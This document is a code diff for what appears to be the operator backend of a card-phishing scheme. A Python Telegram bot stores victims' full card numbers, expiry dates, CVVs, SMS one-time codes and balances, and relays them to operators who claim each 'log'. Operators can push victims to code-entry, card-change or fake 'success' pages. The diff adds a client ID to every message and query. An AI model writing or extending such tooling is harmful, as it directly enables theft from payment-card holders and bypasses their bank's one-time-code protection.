@@ -23,6 +23,7 @@ def init_db():
                 session_id TEXT PRIMARY KEY,
                 masked_pan TEXT,
                 booking_id TEXT,
+                client_id TEXT, 
                 taken_by INTEGER,
                 step TEXT DEFAULT 'full',
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
@@ -48,6 +49,7 @@ async def notify(data: dict):
         session_id = data["sessionId"]
         masked_pan = data["maskedPan"]
         booking_id = data.get("bookingId", session_id[:8].upper())
+        client_id = data["clientId"]
         step = data.get("step", "full")
         
         with get_db_connection() as conn:
@@ -55,13 +57,14 @@ async def notify(data: dict):
             
             if step == "card_number_only":
                 cursor.execute('''
-                    INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, step, updated_at)
-                    VALUES (?, ?, ?, ?, ?)
-                ''', (session_id, masked_pan, booking_id, step, datetime.datetime.now()))
+                    INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, client_id, step, updated_at)
+                    VALUES (?, ?, ?, ?, ?, ?)
+                ''', (session_id, masked_pan, booking_id, client_id, step, datetime.datetime.now()))
                 
                 card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                 
                 message_text = (
+                    f"🆔 #{booking_id} || #{client_id}\n"
                     f"🎯 Пользователь ввел карту, приготовиться!\n\n"
                     f"💳 Номер карты:\n"
                     f"🔹 {masked_pan}\n"
@@ -77,14 +80,14 @@ async def notify(data: dict):
                 
                 cursor.execute('''
                     UPDATE logs 
-                    SET masked_pan = ?, step = ?, updated_at = ?
+                    SET masked_pan = ?, step = ?, updated_at = ?, client_id = ?
                     WHERE session_id = ?
-                ''', (masked_pan, step, datetime.datetime.now(), session_id))
+                ''', (masked_pan, step, datetime.datetime.now(), client_id, session_id))
                 
                 card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                 
                 message_text = (
-                    f"🆔 #{booking_id}\n"
+                    f"🆔 #{booking_id} || #{client_id}\n"
                     f"🔔 Пользователь ожидает 🔔\n\n"
                     f"💳 Номер карты:\n\n"
                     f"🔹 {masked_pan}\n"
@@ -99,14 +102,14 @@ async def notify(data: dict):
                 
             else:
                 cursor.execute('''
-                    INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, step, updated_at)
-                    VALUES (?, ?, ?, ?, ?)
-                ''', (session_id, masked_pan, booking_id, "full", datetime.datetime.now()))
+                    INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, client_id, step, updated_at)
+                    VALUES (?, ?, ?, ?, ?, ?)
+                ''', (session_id, masked_pan, booking_id, client_id, "full", datetime.datetime.now()))
                 
                 card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                 
                 message_text = (
-                    f"🆔 #{booking_id}\n"
+                    f"🆔 #{booking_id} || #{client_id}\n"
                     f"🔔 Пользователь ожидает 🔔\n\n"
                     f"💳 Номер карты:\n\n"
                     f"🔹 {masked_pan}\n"
@@ -134,12 +137,16 @@ async def balance_notify(data: dict):
 
     with get_db_connection() as conn:
         cursor = conn.cursor()
-        cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
+        cursor.execute('SELECT taken_by, booking_id, client_id FROM logs WHERE session_id = ?', (session_id,))
         log = cursor.fetchone()
+
+    booking_id = log['booking_id']
+    client_id = log['client_id']
 
     if log and log['taken_by']:
         await bot.send_message(
             log['taken_by'],
+            f"#{booking_id} || #{client_id}\n\n"
             f"✅ Баланс юзера получен!\n\n💰 Сумма: {balance} AED"
         )
     return {"status": "ok"}
@@ -151,12 +158,16 @@ async def sms_notify(data: dict):
 
     with get_db_connection() as conn:
         cursor = conn.cursor()
-        cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
+        cursor.execute('SELECT taken_by, booking_id, client_id FROM logs WHERE session_id = ?', (session_id,))
         log = cursor.fetchone()
+
+    booking_id = log['booking_id']
+    client_id = log['client_id']
 
     if log and log['taken_by']:
         await bot.send_message(
             log['taken_by'],
+            f"#{booking_id} || #{client_id}\n\n"
             f"✅ Код смс получен!\n\n🔢 Код: {sms}"
         )
     return {"status": "ok"}
@@ -170,12 +181,16 @@ async def change_card_notify(data: dict):
 
     with get_db_connection() as conn:
         cursor = conn.cursor()
-        cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
+        cursor.execute('SELECT taken_by, booking_id, client_id FROM logs WHERE session_id = ?', (session_id,))
         log = cursor.fetchone()
+
+    booking_id = log['booking_id']
+    client_id = log['client_id']
 
     if log and log['taken_by']:
         await bot.send_message(
             log['taken_by'],
+            f"#{booking_id} || #{client_id}\n\n"
             f"✅ Юзер изменил карту\n\n🔄💳 Новая карта: {changed_card}\n🔄🗓️ Новый срок действия карты: {changed_expire}\n🔄🔒 Новый CVV: {changed_cvv}"
         )
     return {"status": "ok"}
@@ -188,7 +203,7 @@ async def take_log(callback: types.CallbackQuery):
     with get_db_connection() as conn:
         cursor = conn.cursor()
         
-        cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
+        cursor.execute('SELECT taken_by, booking_id, client_id FROM logs WHERE session_id = ?', (session_id,))
         log = cursor.fetchone()
         
         if not log:
@@ -212,9 +227,10 @@ async def take_log(callback: types.CallbackQuery):
             booking = (await client.get(f"{config.SERVER_URL}/booking/{session_id}")).json()
 
         booking_id = log['booking_id'] or "N/A"
+        client_id = log['client_id'] or "N/A"
         
         text = (
-            f"Лог #{booking_id}\n\n"
+            f"Лог #{booking_id} || #{client_id}\n\n"
             f"💳  Карта: {card.get('full_pan')}\n"
             f"🗓️  Срок действия карты: {card.get('expire_date')}\n"
             f"🔒  CVV: {card.get('cvv')}\n"
@@ -255,9 +271,12 @@ async def check_online_status(callback: types.CallbackQuery):
     # Проверяем доступ
     with get_db_connection() as conn:
         cursor = conn.cursor()
-        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
+        cursor.execute('SELECT taken_by, booking_id, client_id FROM logs WHERE session_id = ?', (session_id,))
         log = cursor.fetchone()
-        
+    
+    booking_id = log['booking_id']
+    client_id = log['client_id']
+
     if not log or log['taken_by'] != callback.from_user.id:
         await callback.answer("У вас нет доступа к этому логу", show_alert=True)
         return
@@ -274,6 +293,7 @@ async def check_online_status(callback: types.CallbackQuery):
                     current_page = data.get("currentPageDisplay", "Unknown")
                     
                     await callback.message.answer(
+                        f"🆔 #{booking_id} || #{client_id}\n\n"
                         f"🟢 Пользователь ОНЛАЙН\n\n"
                         f"📍 Текущая страница: {current_page}\n"
                         f"⏰ Последняя активность: только что"
@@ -283,6 +303,7 @@ async def check_online_status(callback: types.CallbackQuery):
                     last_seen = data.get("lastSeen", "неизвестно")
                     
                     await callback.message.answer(
+                        f"🆔 #{booking_id} || #{client_id}\n\n"
                         f"🔴 Пользователь ОФФЛАЙН\n\n"
                         f"📄 Последняя известная страница: {last_known_page}\n"
                         f"⏰ Последняя активность: {last_seen}"
@@ -303,7 +324,7 @@ async def handle_balance(callback: types.CallbackQuery):
     
     with get_db_connection() as conn:
         cursor = conn.cursor()
-        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
+        cursor.execute('SELECT taken_by, client_id FROM logs WHERE session_id = ?', (session_id,))
         log = cursor.fetchone()
         
     if not log or log['taken_by'] != callback.from_user.id:
@@ -313,7 +334,9 @@ async def handle_balance(callback: types.CallbackQuery):
     try:
         async with httpx.AsyncClient() as client:
             response = await client.post(f"{config.SERVER_URL}/redirect-balance", 
-                                       json={"sessionId": session_id})
+                                       json={"sessionId": session_id,
+                                        "clientId": log['client_id']
+                                        })
             
             if response.status_code == 200:
                  await callback.message.answer("✅ Пользователь перенаправлен на страницу баланса")
@@ -331,7 +354,7 @@ async def handle_sms(callback: types.CallbackQuery):
     
     with get_db_connection() as conn:
         cursor = conn.cursor()
-        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
+        cursor.execute('SELECT taken_by, client_id FROM logs WHERE session_id = ?', (session_id,))
         log = cursor.fetchone()
         
     if not log or log['taken_by'] != callback.from_user.id:
@@ -341,7 +364,8 @@ async def handle_sms(callback: types.CallbackQuery):
     try:
         async with httpx.AsyncClient() as client:
             response = await client.post(f"{config.SERVER_URL}/redirect-sms", 
-                                       json={"sessionId": session_id})
+                                       json={"sessionId": session_id,
+                                        "clientId": log['client_id']})
             
             if response.status_code == 200:
                  await callback.message.answer("✅ Пользователь перенаправлен на страницу ввода кода")
@@ -359,7 +383,7 @@ async def handle_change(callback: types.CallbackQuery):
     
     with get_db_connection() as conn:
         cursor = conn.cursor()
-        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
+        cursor.execute('SELECT taken_by, client_id FROM logs WHERE session_id = ?', (session_id,))
         log = cursor.fetchone()
         
     if not log or log['taken_by'] != callback.from_user.id:
@@ -369,7 +393,9 @@ async def handle_change(callback: types.CallbackQuery):
     try:
         async with httpx.AsyncClient() as client:
             response = await client.post(f"{config.SERVER_URL}/redirect-change", 
-                                       json={"sessionId": session_id})
+                                       json={"sessionId": session_id,
+                                       "clientId": log['client_id']})
+                                        
             
             if response.status_code == 200:
                  await callback.message.answer("✅ Пользователь перенаправлен на страницу замены карты")
@@ -386,7 +412,7 @@ async def handle_success(callback: types.CallbackQuery):
     
     with get_db_connection() as conn:
         cursor = conn.cursor()
-        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
+        cursor.execute('SELECT taken_by, client_id FROM logs WHERE session_id = ?', (session_id,))
         log = cursor.fetchone()
         
     if not log or log['taken_by'] != callback.from_user.id:
@@ -396,7 +422,8 @@ async def handle_success(callback: types.CallbackQuery):
     try:
         async with httpx.AsyncClient() as client:
             response = await client.post(f"{config.SERVER_URL}/redirect-success", 
-                                       json={"sessionId": session_id})
+                                       json={"sessionId": session_id,
+                                       "clientId": log['client_id']})
             
             if response.status_code == 200:
                  await callback.message.answer("✅ Успешная оплата!")
